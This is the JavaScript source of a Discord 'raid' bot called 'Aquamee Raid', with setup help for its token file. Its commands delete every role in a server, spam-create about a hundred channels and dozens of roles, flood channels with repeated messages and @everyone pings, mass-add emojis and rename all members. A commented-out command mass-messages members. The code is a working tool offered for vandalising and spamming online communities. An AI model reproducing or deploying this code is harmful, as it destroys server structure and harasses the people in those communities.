const express = require('express')
const app = express()
const port = 8080

app.get('/', (req, res) => {
  res.send(`
  <head><b>Aquamee Raid</b></head>
  <p>Current Version: v1.0.0</p>
  <p2>Devlopter:
  Meow ku And Alison</p2>
  Dont Touch Any Files And Give Us Credits !!!`)
})

app.listen(port, () => {
  console.log(`Listening at http://localhost:${port}`)
})


const Discord = require("discord.js");
const {  token } = require('./token-here.json');
const {  prefix } = require('./token-here.json');
const {  word } = require('./token-here.json');
const {  status } = require('./token-here.json');
const {  playing } = require('./token-here.json');



const client = new Discord.Client();
var fs = require("fs");
var async = require("async");
var os = require("os");
const talkedRecently = new Set();
var colors = require('colors');

module.exports = (value) => {
  return value
}



client.once('ready', () => {
    client.user.setActivity(`${status}`,{
        type: `${playing}`
    })
   console.log("\x1b[33m%s\x1b[0m" ,"Raid: \x1b[37mReady");
    console.log(`
=============
|Raid By Aquamee
|Raid v.1.0.0
|Raid Process▫️▫️▫️▫️▫️ 100%
|New Update At: 15/May/2021
|Fix Bugs: Error At Quick Settings
=============
| Developtor|
| - Alison_ |
| - Meow ku |
=============
\x1b[45mLogged As\x1b[33m ${client.user.tag}\x1b[0m
`)

  })

client.on("message", message => {
client.on('error', console.error);
var args = message.content.substring(prefix.length).split(" ");
console.log(message.content);

})

client.on('message', message => {

   const randomBetween = (min, max) => Math.floor(Math.random()*(max-min+1)+min);

   const color = [
     randomBetween(0, 255),
     randomBetween(0, 255),
     randomBetween(0, 255),
   ];


//invite
if (message.content === "!inv") {
   message.channel.send(`https://discord.gg/U3kH65FxGs`)
}




//quick spam
if(message.content === "!ez") {
   message.channel.send(word) 
    message.channel.send(word)
    message.channel.send(word)
   message.channel.send(word)
   message.channel.send(word) 
   message.channel.send(word) 
   message.channel.send(word) 
    message.channel.send(word)
    message.channel.send(word)
   message.channel.send(word)
   message.channel.send(word) 
   message.channel.send(word) 
    message.channel.send(word)
   message.channel.send(word)
   message.channel.send(word) 
    message.channel.send(word)
    message.channel.send(word)
   message.channel.send(word)
   message.channel.send(word) 
   message.channel.send(word) 
    message.channel.send(word)
   message.channel.send(word)
 message.channel.send(word)
   message.channel.send(word) 
   message.channel.send(word) 
    message.channel.send(word)
    message.channel.send(word)
   message.channel.send(word)
   message.channel.send(word) 
   message.channel.send(word) 
    message.channel.send(word)
   message.channel.send(word)
   message.channel.send(word) 
    message.channel.send(word)
    message.channel.send(word)
   message.channel.send(word)
   message.channel.send(word) 
   message.channel.send(word) 

  }


//deleteroles
if(message.content.startsWith(`!cr`)) {
   message.delete(.100);
    message.guild.roles.forEach(role => role.delete())
}
//masschannels
if(message.content.startsWith("!mass")) {
   message.delete(.100);
    message.guild.createChannel("raid", "voice" );
message.guild.createChannel("raid", "voice" );
message.guild.createChannel("raid", "voice" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
message.guild.createChannel("raid", "text" );
}
//massroles
if(message.content.startsWith("!roles")) {
   message.delete(.100);
    var args = message.content.split(" ");
    args.shift();
    message.guild.createRole({
       name: args [0],
       
    })
    message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
     message.guild.createRole({
        name: args [0],
        
     })
}
//Delete /* and */ for use this commands
/*
//dmall
if(message.content.startsWith("!dmall")){
   message.delete(.100);

   let args = message.content.split(" ").slice(1);
   var argresult = args.join(' ');
   message.guild.members.filter(m => m.presence.status !== 'online').forEach(m => {
      m.send(`${argresult}`);
   })
}
*/
//massmessagesif(message.content.startsWith("!msg")){

   /* This takes the sentence sent, and makes it an array. In this case, a list of words. It 'splits' the list up wherever it sees space.*/
  if(message.content === "!!msgs") {
    message.guild.createChannel("Aquamee", "text" );
  }
  if(message.content === "!msgs") {
  message.channel.send(`
  @everyone 
  Get Raid Ass
Raid By Aquamee
Raid v.1.0.0
Server : discord.gg/
=============
|.     Developtor.      |
| - Alison_.               |
| - Meow ku.            |
=============
  `)
  }
   
if(message.content.startsWith("!msg")){

   /* This takes the sentence sent, and makes it an array. In this case, a list of words. It 'splits' the list up wherever it sees space.*/
   let sentence = message.content.split(" ");
   
   /* .shift(), alters the list. It removes the first thing in the list. This would be the "!say" word. If we assigned shift() to a variable. Like "let x = message.shift()" ... "x" would be the word that was removed. This is handy for grabbing command words. If you used shift() again, it would remove the second, then the third, each time that you type it.*/
   sentence.shift();

   // Now join the list back together into a sentence with "join()" and set that as the new sentence.
   sentence = sentence.join(" ");

   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);
   message.channel.send(sentence);


}




//massemojis
if (message.content === "!emo") {
   message.guild.createEmoji("https://cdn.discordapp.com/emojis/768595803509751958.png?v=1")
   message.guild.createEmoji("https://cdn.discordapp.com/emojis/768596985460293652.png?v=1")
   message.guild.createEmoji("https://cdn.discordapp.com/emojis/768596985313493032.png?v=1", "Raided")
   message.guild.createEmoji("https://cdn.discordapp.com/emojis/768596985564495892.png?v=1", "Raided")
   message.guild.createEmoji("https://cdn.discordapp.com/emojis/768596986403618896.png?v=1", "Raided")
   message.guild.createEmoji("https://cdn.discordapp.com/emojis/768596986337165362.png?v=1", "Raided")
   message.guild.createEmoji("https://cdn.discordapp.com/emojis/768596986176864277.png?v=1", "Raided")
   message.guild.createEmoji("https://cdn.discordapp.com/emojis/768596986285916160.png?v=1", "Raided")
   message.guild.createEmoji("https://cdn.discordapp.com/emojis/768596986458013747.png?v=1", "Raided")
   message.guild.createEmoji("https://cdn.discordapp.com/emojis/768596986357088266.png?v=1", "Raided")
   message.guild.createEmoji("https://cdn.discordapp.com/emojis/768595803509751958.png?v=1", "Raided")
   message.guild.createEmoji("https://cdn.discordapp.com/emojis/768596985460293652.png?v=1", "Raided")
   message.guild.createEmoji("https://cdn.discordapp.com/emojis/768596985313493032.png?v=1", "Raided")
   message.guild.createEmoji("https://cdn.discordapp.com/emojis/768596985564495892.png?v=1", "Raided")
   message.guild.createEmoji("https://cdn.discordapp.com/emojis/768596986403618896.png?v=1", "Raided")
   message.guild.createEmoji("https://cdn.discordapp.com/emojis/768596986337165362.png?v=1", "Raided")
   message.guild.createEmoji("https://cdn.discordapp.com/emojis/768596986176864277.png?v=1", "Raided")
   message.guild.createEmoji("https://cdn.discordapp.com/emojis/768596986285916160.png?v=1", "Raided")
   message.guild.createEmoji("https://cdn.discordapp.com/emojis/768596986458013747.png?v=1", "Raided")
   message.guild.createEmoji("https://cdn.discordapp.com/emojis/768596986357088266.png?v=1", "Raided")
   
}

//massemojis
if (message.content === "!emos") {
   message.channel.send("https://cdn.discordapp.com/emojis/768595803509751958.png?v=1")
   message.channel.send("https://cdn.discordapp.com/emojis/768596985460293652.png?v=1")
   message.channel.send("https://cdn.discordapp.com/emojis/768596985313493032.png?v=1")
   message.channel.send("https://cdn.discordapp.com/emojis/768596985564495892.png?v=1")
   message.channel.send("https://cdn.discordapp.com/emojis/768596986403618896.png?v=1")
   message.channel.send("https://cdn.discordapp.com/emojis/768596986337165362.png?v=1")
   message.channel.send("https://cdn.discordapp.com/emojis/768596986176864277.png?v=1")
   message.channel.send("https://cdn.discordapp.com/emojis/768596986285916160.png?v=1")
   message.channel.send("https://cdn.discordapp.com/emojis/768596986458013747.png?v=1")
   message.channel.send("https://cdn.discordapp.com/emojis/768596986357088266.png?v=1")
   message.channel.send("https://cdn.discordapp.com/emojis/768595803509751958.png?v=1")
   message.channel.send("https://cdn.discordapp.com/emojis/768596985460293652.png?v=1")
   message.channel.send("https://cdn.discordapp.com/emojis/768596985313493032.png?v=1")
   message.channel.send("https://cdn.discordapp.com/emojis/768596985564495892.png?v=1")
   message.channel.send("https://cdn.discordapp.com/emojis/768596986403618896.png?v=1")
   message.channel.send("https://cdn.discordapp.com/emojis/768596986337165362.png?v=1")
   message.channel.send("https://cdn.discordapp.com/emojis/768596986176864277.png?v=1")
   message.channel.send("https://cdn.discordapp.com/emojis/768596986285916160.png?v=1")
   message.channel.send("https://cdn.discordapp.com/emojis/768596986458013747.png?v=1")
   message.channel.send("https://cdn.discordapp.com/emojis/768596986357088266.png?v=1")
}
//setnick
if(message.content.startsWith("!nick")) {
   let nick = message.content.slice(("!nick").length)

   message.guild.members.forEach(r=>r.setNickname(nick))

   message.channel.send("Changing Nicknames");
}
//raidhelp
if(message.content === "!helpp") {
  message.channel.send("Look Your Dm")
   message.author.send(`
   \`Aquamee Raid v1.0.0\`
   **Devlopter**
   \`- Meow ku#4794\`
   \`- Alison_#7153\`
   **Settings**
   In token-here.json
   • \`status\` [Replace Your Custom Status]
   • \`playing\` [Replace With \`PLAYING\`, \`WATCHING\`, \`LISTENING\`, \`STREAMING\`]
   • \`token\` [Replace your Bot token]
   • \`word\` [Replace Your Custom Word Then Use !ez]
   • \`prefix\` [Dont Delete It And Dont Change It!!!]
   **Commands**
   • \`!cr\` [Clear Roles]
   • \`!mass\` [Mass Channel]
   • \`!msg\` <Word> [Mass Message]
   • \`!emo\` [Mass Emoji]
   • \`!emos\` [Send Images]
   • \`!roles\` [Mass Roles]
   • \`!nick\` <Name> [New Nick]
   • \`!!msgs\` [Make New 1 Channels]
   • \`!msgs\` [Tell everyone get raided]
   • \`!ez\` [Put Ur Word In Token-here.json Then Type !ez]
   `)
}
   
   
   
   
});

client.login(token);

